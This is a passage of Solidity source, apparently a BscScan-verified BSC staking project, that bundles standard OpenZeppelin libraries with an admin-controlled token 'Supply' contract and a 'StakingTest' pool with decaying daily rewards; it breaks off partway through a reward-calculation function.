/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol


// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/utils/math/SafeMath.sol


// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// File: @openzeppelin/contracts/utils/Address.sol


// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

// File: @openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// File: @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/utils/SafeERC20.sol)

pragma solidity ^0.8.0;




/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

// File: rewardsupply.sol



pragma solidity ^0.8.0;




contract Supply is Ownable{
    using SafeERC20 for IERC20;
 
    IERC20 public immutable token;
    mapping(address => bool) public admins;

    event AdminsAdded(address[] admin);
    event AdminsRemoved(address[] admin);
    event TokensTransferred(address _to, uint256 _value);

    modifier onlyAdmin() {
        require (admins[msg.sender], "Only admin can call this function");
        _;
    }

    constructor(IERC20 _token) {
        token = _token;
    }

    function addAdmins(address[] calldata _admins) external onlyOwner{
        uint256 adminsLength = _admins.length;
        for (uint i = 0; i < adminsLength; i++) {
            admins[_admins[i]] = true;
        }
        emit AdminsAdded(_admins);
    }

    function removeAdmins(address[] calldata _admins) external onlyOwner{
        uint256 adminsLength = _admins.length;
        for (uint i = 0; i < adminsLength; i++) {
            admins[_admins[i]] = false;
        }
        emit AdminsRemoved(_admins);
    }

    function safeTokenTransfer(address _to, uint256 _amount) external onlyAdmin {
        uint256 tokenBal = token.balanceOf(address(this));
        if (_amount > tokenBal) {
            token.safeTransfer(_to, tokenBal);
        } else {
            token.safeTransfer(_to, _amount);
        }
        emit TokensTransferred(_to, _amount);
    }
}
// File: stakingtest.sol



pragma solidity ^0.8.0;






// import "hardhat/console.sol";

// Have fun reading it. Hopefully it's bug-free. God bless.
contract StakingTest is Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    // Info of each user.
    struct UserInfo {
        uint256 amount; // How many LP tokens the user has provided.
        uint256 rewardDebt; // Reward debt. See explanation below.
        uint256 timestamp;
        uint256 totalDeposit;
    }
    // Info of each pool.
    struct PoolInfo {
        IERC20 lpToken; // Address of LP token contract.
        uint256 lastRewardTime; // Last block number that TOKENs distribution occurs.
        uint256 accTokenPerShare; // Accumulated TOKENs per share, times 1e18. See below.
        uint256 balance; // How many LP tokens the pool has.
        uint256 lastRewardChange;
        uint256 totalDeposit;
    }

    struct LocalVars1 {
        uint s1; uint n1; uint r1; uint numDays; uint s2; uint rNum; uint r2;
    }
    struct LocalVars2 {
        uint tokenReward;
        uint lastRewardChange;
        uint _newlpSupply;
        uint _amount;

    }
    // The TOKEN TOKEN!
    IERC20 public immutable token;

    Supply public supplyContract;

    PoolInfo public poolInfo;
    // Info of each user that stakes LP tokens.
    mapping(address => UserInfo) public userInfo;
    mapping(address => bool) public userExistence;

    uint256 public startTimestamp;
    uint256 public numUsers;
    uint256 public tokenRewardAmount;
    uint256 public rewardPercent;
    uint256 public decayPercent;

    mapping(IERC20 => bool) public poolExistence;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user);
    event EmergencyWithdraw(
        address indexed user,
        uint256 amount
    );

    event SupplyContractUpdate(Supply supplyContract);

    constructor(
        IERC20 _token,
        uint256 _startTimestamp,
        uint256 _tokenRewardAmount,
        uint256 _rewardPercent,
        uint256 _decayPercent
    ) {
        token = _token;
        require(_startTimestamp > block.timestamp, "startTimestamp in past");
        startTimestamp = _startTimestamp;

        // staking pool
        poolInfo = PoolInfo({
            lpToken: _token,
            lastRewardTime: _startTimestamp,
            accTokenPerShare: 0,
            balance: 0,
            lastRewardChange: _startTimestamp,
            totalDeposit: 0
        });
        poolExistence[_token] = true;

        tokenRewardAmount = _tokenRewardAmount;
        rewardPercent = _rewardPercent;
        decayPercent = _decayPercent;
    }

    function setSupplyContract(Supply _supplyContract) external onlyOwner {
        supplyContract = _supplyContract;
        emit SupplyContractUpdate(_supplyContract);
    }

    function setTokenRewardAmount(uint _amount) external onlyOwner {
        massUpdatePools();
        tokenRewardAmount = _amount;
        startTimestamp = block.timestamp;
        poolInfo.lastRewardTime = block.timestamp;
        poolInfo.lastRewardChange = block.timestamp;
    }

    function setTokenRewardPercent(uint _percent) external onlyOwner {
        massUpdatePools();
        rewardPercent = _percent;
        startTimestamp = block.timestamp;
        poolInfo.lastRewardTime = block.timestamp;
        poolInfo.lastRewardChange = block.timestamp;
    }

    function setDecayPercent(uint _percent) external onlyOwner {
        massUpdatePools();
        decayPercent = _percent;
    }

    function pendingReward(address _user)
        external
        view
        returns (uint256)
    {
        PoolInfo storage pool = poolInfo;
        UserInfo storage user = userInfo[_user];
        uint256 accTokenPerShare = pool.accTokenPerShare;
        uint256 lpSupply = pool.balance;
        if (block.timestamp > pool.lastRewardTime && lpSupply != 0) {
            
            (uint tokenReward, , , ) = _calcReward(user.amount, user.timestamp);
            accTokenPerShare = accTokenPerShare.add(
                tokenReward.mul(1e18).div(lpSupply)
            );
        }
        return user.amount.mul(accTokenPerShare).div(1e18).sub(user.rewardDebt);
    }

    // Update reward variables for all pools. Be careful of gas spending!
    function massUpdatePools() public {
        updatePool();
    }

    function updatePool() public {
        _updatePool(0, 0);
    }

    function _updatePool(uint amount, uint _timestamp) internal returns (uint){
        PoolInfo storage pool = poolInfo;
        if (block.timestamp <= pool.lastRewardTime) {
            return 0;
        }
        uint256 lpSupply = pool.balance;
        if (lpSupply == 0) {
            pool.lastRewardTime = block.timestamp;
            return 0;
        }
        (uint tokenReward, uint lastRewardChange, uint _newlpSupply, uint newAmount) = _calcReward(amount, _timestamp);

        pool.balance = pool.balance.sub(_newlpSupply);

        pool.accTokenPerShare = pool.accTokenPerShare.add(
            tokenReward.mul(1e18).div(pool.balance)
        );
        pool.lastRewardTime = block.timestamp;
        pool.lastRewardChange = pool.lastRewardChange.add(lastRewardChange);
        // pool.balance = pool.balance.sub(_newlpSupply);
        return newAmount;
    }
    
    function _calcReward(uint amount, uint _timestamp) internal view returns(uint, uint, uint, uint){
        PoolInfo memory pool = poolInfo;
        LocalVars2 memory vars;
        if(block.timestamp.sub(pool.lastRewardChange) < 24 hours) {
            vars = _calcRewardLessThan24(pool, amount, _timestamp);
        } else {
            vars = _calcRewardMoreThan24(pool, amount, _timestamp);
            // console.log("local vars 1 - ", vars.s1, vars.numDays, vars.s2);
            // console.log("local vars 2 - ", vars.n1, vars.r1, vars.rNum);
            // console.log("local vars 3 - ", vars.r2, tokenReward, lastRewardChange);
        }
        return (vars.tokenReward, vars.lastRewardChange, vars._newlpSupply, vars._amount);
    }

    function _calcRewardLessThan24(PoolInfo memory pool, uint amount, uint _timestamp) internal view returns (LocalVars2 memory){
        LocalVars1 memory vars;
        // LocalVars1 memory userVars;
        LocalVars2 memory vars2;

        vars.s1 = block.timestamp.sub(pool.lastRewardTime);
        // uint _temp = block.timestamp.sub(_timestamp);
        vars.n1 = pool.lastRewardChange.sub(startTimestamp).div(24 hours).add(1);
        // console.log(vars.n1, pool.lastRewardChange, pool.lastRewardChange.sub(startTimestamp).div(24 hours));
        vars.r1 = tokenRewardAmount.mul(rewardPercent).mul(pow(10000 - (rewardPercent), vars.n1.sub(1))).div(pow(10000, vars.n1));
        vars2.tokenReward = vars.r1.mul(vars.s1).div(24 hours);
